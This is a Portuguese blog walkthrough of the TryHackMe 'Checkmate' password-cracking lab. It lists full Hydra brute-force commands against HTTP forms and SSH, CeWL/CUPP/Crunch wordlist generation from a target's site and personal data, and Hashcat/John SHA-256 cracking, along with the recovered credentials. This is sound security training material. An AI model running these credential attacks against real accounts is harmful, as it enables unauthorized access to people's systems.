---
layout: post
title: "Checkmate - Quebrando senhas!"
description: "Walkthrough da room Checkmate do TryHackMe: criação de wordlists, Hydra, CeWL, CUPP, Hashcat, John, Crunch e análise de padrões de senha."
date: 2026-10-03
categories: [walkthrough, pentest, tryhackme]
tags: [passwords, hydra, cewl, cupp, hashcat, john, crunch, wordlist, ssh, tryhackme]
---

# Checkmate - Quebrando senhas!

## 1. Introdução

Na room **Checkmate**, Marco Bianchi é um administrador de sistemas que implantou vários serviços internos, como firewall, portal de funcionários, rede social e acesso SSH.

O problema é que ele reutilizou senhas fracas, previsíveis e baseadas em padrões.

Nosso objetivo é identificar essas falhas passando por cinco níveis diferentes:

~~~text
Credencial padrão
      ↓
Palavras da empresa
      ↓
Dados pessoais
      ↓
Hash SHA-256
      ↓
Padrão previsível de senha
      ↓
Acesso SSH
~~~

> Este walkthrough foi realizado em um ambiente autorizado do TryHackMe. Use as técnicas apenas em laboratórios, sistemas próprios ou ambientes para os quais exista autorização explícita.

O alvo principal da room era:

~~~text
10.64.181.140
~~~

---

# 2. Level 1 - Credencial padrão

O primeiro serviço era um firewall em:

~~~text
firewall.thm:5001
~~~

A própria página já indicava o usuário administrativo, então utilizei:

~~~text
admin
~~~

A senha era extremamente simples. Mesmo sem adivinhá-la manualmente, poderíamos testar uma pequena lista de senhas comuns com Hydra.

~~~bash
hydra -l admin \
  -P /root/10-million-password-list-top-1000.txt \
  -f -V -t 4 \
  -s 5001 \
  10.64.181.140 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
~~~

### Principais opções

| Opção | Função |
|---|---|
| <code>-l admin</code> | Define um único usuário |
| <code>-P arquivo</code> | Usa uma wordlist de senhas |
| <code>-f</code> | Para após encontrar uma credencial válida |
| <code>-V</code> | Mostra as tentativas |
| <code>-t 4</code> | Usa quatro tarefas simultâneas |
| <code>-s 5001</code> | Define a porta do serviço |

A expressão:

~~~text
Invalid credentials.
~~~

funciona como condição de falha. Enquanto essa mensagem aparecer na resposta, o Hydra sabe que a tentativa não funcionou.

### Aprendizado

Credenciais padrão ou extremamente comuns continuam sendo um dos primeiros pontos que devem ser verificados em uma avaliação de segurança.

---

# 3. Level 2 - Criando uma wordlist com CeWL

O segundo serviço era o portal de funcionários:

~~~text
jobs.thm:5002
~~~

A dica dizia que Marco utilizava **palavras comuns da empresa como senha**.

Em vez de usar uma lista genérica enorme, podemos coletar palavras diretamente do site com o CeWL.

~~~bash
cewl -d 2 -m 5 --lowercase -w keywords.txt http://10.64.181.140:5002
~~~

### Opções utilizadas

| Opção | Função |
|---|---|
| <code>-d 2</code> | Segue links até dois níveis |
| <code>-m 5</code> | Coleta palavras com pelo menos cinco caracteres |
| <code>--lowercase</code> | Converte tudo para minúsculas |
| <code>-w keywords.txt</code> | Salva o resultado no arquivo |

Na VM da room, o CeWL estava tentando usar uma instalação do Ruby gerenciada pelo rbenv e apresentou:

~~~text
cannot load such file -- cewl_lib (LoadError)
~~~

Temporariamente, forcei o uso dos binários do sistema:

~~~bash
PATH=/usr/bin:/bin cewl -d 2 -m 5 --lowercase -w keywords.txt http://10.64.181.140:5002
~~~

Depois:

~~~bash
wc -l keywords.txt
~~~

Resultado:

~~~text
73 keywords.txt
~~~

Agora bastava testar essas palavras como senha do usuário Marco:

~~~bash
hydra -l marco \
  -P /root/keywords.txt \
  -f -V -t 4 \
  -s 5002 \
  10.64.181.140 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
~~~

O Hydra encontrou:

~~~text
login: marco
password: excellence
~~~

### Aprendizado

Uma wordlist específica do alvo costuma ser muito mais eficiente do que começar diretamente com milhões de senhas genéricas.

---

# 4. Level 3 - Dados pessoais e CUPP

O próximo serviço era a rede social em:

~~~text
social.thm:5003
~~~

A dica dizia para utilizar as informações descobertas anteriormente.

Os dados disponíveis eram:

~~~text
Full Name: Marco Bianchi
Nickname: marky
Birthdate: 14/02/1995
~~~

Esse cenário combina muito bem com o **CUPP**, que gera possíveis senhas a partir de informações pessoais.

Execute:

~~~bash
cupp -i
~~~

E informe:

~~~text
First Name: Marco
Surname: Bianchi
Nickname: marky
Birthdate (DDMMYYYY): 14021995
~~~

A wordlist gerada tinha milhares de combinações:

~~~bash
wc -l marco.txt
~~~

~~~text
9675 marco.txt
~~~

Depois, testamos novamente com Hydra:

~~~bash
hydra -l marco \
  -P /root/marco.txt \
  -f -V -t 4 \
  -s 5003 \
  10.64.181.140 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
~~~

Credencial encontrada:

~~~text
login: marco
password: Bianchi2495
~~~

### Aprendizado

Nome, sobrenome, apelido e data de nascimento ainda aparecem com frequência em senhas reais. Ferramentas como CUPP automatizam a criação dessas combinações.

---

# 5. Level 4 - Identificando o nome original pelo SHA-256

Ainda em <code>social.thm:5003</code>, a plataforma renomeava imagens de perfil usando o SHA-256 do nome original do arquivo.

No HTML da página aparecia:

~~~html
<img class="avatar-img"
     src="/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png"
     alt="Profile">
~~~

O hash era:

~~~text
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
~~~

Primeiro, salvei o valor:

~~~bash
echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt
~~~

Isso também ajuda a manter os artefatos do teste organizados.

## Testando com Hashcat

Como sabemos que o hash é SHA-256:

~~~bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
~~~

O modo:

~~~text
-m 1400
~~~

corresponde a SHA2-256.

Resultado:

~~~text
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family
~~~

Portanto, o nome original era:

~~~text
family
~~~

## Confirmando com John the Ripper

Também podemos validar com John:

~~~bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
~~~

Resultado:

~~~text
family
~~~

Para visualizar resultados já quebrados:

~~~bash
john --show --format=Raw-SHA256 hash.txt
~~~

### CrackStation

Antes de utilizar ferramentas locais, também é possível consultar serviços como o CrackStation para hashes não sensíveis de laboratório. Nesse caso, ele identificou o SHA-256 e encontrou o mesmo valor: <code>family</code>.

### Aprendizado

Hash não é criptografia. Quando o valor original é previsível e aparece em wordlists conhecidas, podemos calcular hashes das palavras candidatas e comparar os resultados.

---

# 6. Level 5 - Explorando um padrão previsível

No perfil social, Marco publicou uma dica sobre como criava suas senhas.

O padrão era basicamente:

~~~text
PalavraDaEmpresa + ano/número + !
~~~

Um exemplo seria:

~~~text
Excellence2024!
~~~

Minha primeira tentativa foi gerar todas as combinações numéricas para a palavra <code>Excellence</code>.

~~~bash
crunch 15 15 -t Excellence%%%%! -o level5.txt
~~~

O caractere:

~~~text
%
~~~

no Crunch representa um número.

Isso gerou:

~~~text
10000 level5.txt
~~~

Depois:

~~~bash
hydra -l marco -P level5.txt ssh://10.64.181.140
~~~

Não funcionou.

O padrão estava correto, mas a palavra-base não era <code>Excellence</code>.

---

# 7. Refinando a wordlist

Voltei às palavras coletadas com CeWL.

Como várias palavras pequenas eram genéricas, refiz a coleta exigindo pelo menos oito caracteres:

~~~bash
PATH=/usr/bin:/bin cewl -d 2 -m 8 --lowercase -w keywords.txt http://10.64.181.140:5002
~~~

A lista caiu de 73 para aproximadamente 36 palavras.

Agora queríamos gerar senhas neste formato:

~~~text
Palavra202N!
~~~

Em vez de usar o Crunch para criar todas as combinações possíveis de caracteres, usamos um loop sobre as palavras que já havíamos coletado:

~~~bash
while read -r word; do
  cap="${word^}"

  crunch 1 1 0123456789 | while read -r n; do
    echo "${cap}202${n}!"
  done
done < keywords.txt > level5.txt
~~~

O fluxo fica assim:

~~~text
security
   ↓
Security
   ↓
Security2020!
Security2021!
Security2022!
...
Security2029!
~~~

Isso reduz bastante o número de tentativas, pois estamos utilizando duas informações conhecidas:

1. palavras relacionadas à empresa;
2. o padrão de senha divulgado pelo próprio usuário.

---

# 8. Confirmando o SSH

Antes do ataque, vale confirmar se o SSH realmente está disponível na porta padrão:

~~~bash
nmap -p 22 10.64.181.140
~~~

Com a porta 22 disponível, executamos:

~~~bash
hydra -l marco -P level5.txt -t 4 ssh://10.64.181.140
~~~

Dessa vez:

~~~text
[22][ssh] host: 10.64.181.140
login: marco
password: Security2024!
~~~

A senha final era:

~~~text
Security2024!
~~~

A primeira lista falhou porque a estrutura estava correta, mas a palavra-base estava errada.

---

# 9. Fluxo completo da room

~~~text
Level 1
Credencial padrão
      ↓
Hydra
      ↓
acesso ao firewall

Level 2
Website corporativo
      ↓
CeWL
      ↓
keywords.txt
      ↓
Hydra
      ↓
excellence

Level 3
Nome + apelido + nascimento
      ↓
CUPP
      ↓
marco.txt
      ↓
Hydra
      ↓
Bianchi2495

Level 4
SHA-256 do nome do arquivo
      ↓
Hashcat / John
      ↓
family

Level 5
Postagem revela padrão
      ↓
CeWL + transformação
      ↓
wordlist direcionada
      ↓
Hydra SSH
      ↓
Security2024!
~~~

---

# 10. Principais ferramentas

| Ferramenta | Uso na room |
|---|---|
| **Hydra** | Teste automatizado de credenciais em HTTP e SSH |
| **CeWL** | Criação de wordlist baseada no conteúdo do site |
| **CUPP** | Geração de senhas com dados pessoais |
| **Hashcat** | Ataque de dicionário contra SHA-256 |
| **John the Ripper** | Validação do hash com wordlist |
| **Crunch** | Geração de combinações seguindo um padrão |
| **Nmap** | Confirmação do serviço SSH |

---

# 11. O principal aprendizado

A room mostra bem por que ataques de senha não se resumem a jogar a <code>rockyou.txt</code> contra tudo.

O processo mais eficiente foi:

~~~text
coletar informação
      ↓
identificar padrão
      ↓
reduzir possibilidades
      ↓
criar uma wordlist específica
      ↓
testar
      ↓
refinar
~~~

Em cada nível utilizamos informações cada vez mais específicas:

- credenciais padrão;
- palavras presentes no ambiente da empresa;
- dados pessoais;
- nomes previsíveis de arquivos;
- padrões divulgados pelo próprio usuário.

No último nível, por exemplo, não precisávamos testar milhões de senhas. Já sabíamos aproximadamente o formato e tínhamos uma pequena lista de palavras relacionadas ao alvo.

Esse é o ponto principal da room: **quanto melhor o reconhecimento e a análise do comportamento do usuário, menor pode ser o espaço de busca necessário para encontrar uma senha previsível.**

---

## Referência rápida

### CeWL

~~~bash
cewl -d 2 -m 5 --lowercase -w keywords.txt http://10.64.181.140:5002
~~~

### CUPP

~~~bash
cupp -i
~~~

### Hashcat - SHA-256

~~~bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
~~~

### John

~~~bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
~~~

### Crunch

~~~bash
crunch 15 15 -t Excellence%%%%! -o level5.txt
~~~

### Hydra - HTTP POST

~~~bash
hydra -l marco \
  -P keywords.txt \
  -f -V -t 4 \
  -s 5002 \
  10.64.181.140 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
~~~

### Hydra - SSH

~~~bash
hydra -l marco -P level5.txt -t 4 ssh://10.64.181.140
~~~

---

## Conclusão

A Checkmate trabalha principalmente a ideia de **password profiling**: usar informações do próprio ambiente e do comportamento do usuário para criar tentativas muito mais direcionadas.

A sequência da room foi:

~~~text
default password
→ company keywords
→ personal information
→ hash cracking
→ password pattern
→ SSH
~~~

Mais importante do que decorar os comandos é entender por que cada wordlist foi criada e como as informações encontradas em uma etapa reduziram as possibilidades da etapa seguinte.
